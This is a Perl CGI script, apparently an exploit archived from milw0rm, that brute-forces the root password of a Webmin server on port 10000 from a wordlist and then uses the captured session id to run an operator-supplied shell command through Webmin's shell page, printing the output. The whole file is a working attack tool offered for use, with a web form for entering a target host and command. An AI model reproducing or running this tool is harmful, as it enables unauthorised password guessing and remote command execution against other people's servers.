#!/usr/bin/perl

use CGI qw(:standard);
use IO::Socket;
$CGI::HEADERS_ONCE = 1;
$CGI = new CGI;

$atak = $CGI->param("atak");
$host = $CGI->param("host");
$wlist = $CGI->param("wlist");
$cmd = $CGI->param("cmd");

print $CGI->header(-type=>'text/html',-charset=>'windows-1254');
print qq~<html><head><meta http-equiv=Content-Type" content=text/html;
charset=ISO-8859-9><title>Webmin Web Brute Force v1.5 - cgi
versiyon</title></head>
<body bgcolor=black text=red>Webmin Web Brute Force v1.5 - cgi versiyon<br>
<font color=blue>
Webmin BruteForce + Command execution- cgi version<br>
v1.0:By Di42lo  - DiAblo_2@012.net.il<br>
v1.5:By ZzagorR - zzagorrzzagorr@hotmail.com - www.rootbinbash.com<br>
</font>~;
if($atak eq "webmin") {
  open (data, "$wlist");
  @wordlist=<data>;
  close data;
  $passx=@wordlist;
  $chk=0;
  $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host",
PeerPort => "10000",Timeout  => 25) || die "[-] Webmin on this host does not
exist\r\n";
  $sock->close;
  print "[+] BruteForcing...<br>";
  $sid;
  $n=0;
  while ($chk!=1) {
     $n++;
     if($n>$passx){
       exit;
     }
     $pass=@wordlist[$passx-$n];
     $pass_line="page=%2F&user=root&pass=$pass";
     $buffer="POST /session_login.cgi HTTP/1.0\n".
     "Host: $host:10000\n".
     "Keep-Alive: 300\n".
     "Connection: keep-alive\n".
     "Referer: http://$host:10000/\n".
     "Cookie: testing=1\n".
     "Content-Type: application/x-www-form-urlencoded\n".
     "Content-Length: __\n".
     "\n".
     $pass_line."\n\n";
     $line_size=length($pass_line);
     $buffer=~s/__/$line_size/g;
     $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host",
PeerPort => "10000",Timeout  => 25);
     if ($sock){
        print "[+] Denenen sifre: $pass<br>";
        print $sock $buffer;
        while ($answer=<$sock>){
              if ($answer=~/sid=(.*);/g){
                 $chk=1;
                 $sid=$1;
                 print "[+] Found SID : $sid<br>";
                 print "[+] Sifre : $pass<br>";
              }
        }
     }
     $sock->close;
}
print "[+] Connecting to host once again<br>";
$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort
=> "10000",Timeout  => 10) || die "[-] Cant Connect once again for command
execution\n";
print "[+] Connected.. Sending Buffer<br>";
$temp="-----------------------------19777347561180971495777867604\n".
        "Content-Disposition: form-data; name=\"cmd\"\n".
        "\n".
        "$cmd\n".
        "-----------------------------19777347561180971495777867604\n".
        "Content-Disposition: form-data; name=\"pwd\"\n".
        "\n".
        "/root\n".
        "-----------------------------19777347561180971495777867604\n".
        "Content-Disposition: form-data; name=\"history\"\n".
        "\n".
        "\n".
        "-----------------------------19777347561180971495777867604\n".
        "Content-Disposition: form-data; name=\"previous\"\n".
        "\n".
        "$cmd\n".
        "-----------------------------19777347561180971495777867604\n".
        "Content-Disposition: form-data; name=\"pcmd\"\n".
        "\n".
        "$cmd\n".
        "-----------------------------19777347561180971495777867604--\n\n";
$buffer_size=length($temp);
$buffer="POST /shell/index.cgi HTTP/1.1\n".
       "Host: $host:10000\n".
       "Keep-Alive: 300\n".
       "Connection: keep-alive\n".
       "Referer: http://$host:10000/shell/\n".
       "Cookie: sid=$sid\; testing=1; x\n".
       "Content-Type: multipart/form-data;
boundary=---------------------------19777347561180971495777867604\n".
       "Content-Length: siz\n".
       "\n".
$temp;
$buffer=~s/siz/$buffer_size/g;
print $sock $buffer;

if ($sock){
  print "[+] Buffer sent...running command $cmd<br>";
  print $sock $buffer;
  while ($answer=<$sock>){
        if ($answer=~/defaultStatus="(.*)";/g) { print $1."<br>";}
        if ($answer=~/<td><pre><b>>/g){
           $cmd_chk=1;
        }
        if ($cmd_chk==1) {
           if ($answer=~/<\/pre><\/td><\/tr>/g){
              exit;
           } else {
              print $answer;
           }
        }
  }
}
}

if($atak eq ""){
print qq~
<table align=left cellspacing="0" cellpading="0"><form aciton=?><input
type=hidden name=atak value=webmin>
<tr><td colspan="3" align=center>Webmin Web Brute Force v1.5 - cgi
version</td></tr>
<tr><td>Server:</td><td colspan="2"><input type="text" name="host" size="50"
value="www."></td></tr>
<tr><td valign="top">Wordlist:</td><td valign="top"><input type="file"
name="wlist"></td><td valign="top"
align="left">Examples:<br>---------<br>admin<br>administrator<br>redhat<br>mandrake<br>suse<br></td></tr>
<tr><td>Cmd:</td><td colspan="2"><input type="text" name="cmd" size="50"
value="uptime"></td></tr>
<tr><td colspan="3" align="center"><input type="submit" name=""
value="Gooooooo!"></td></tr>
</form></table></body></html>~;
}

# milw0rm.com [2005-01-08]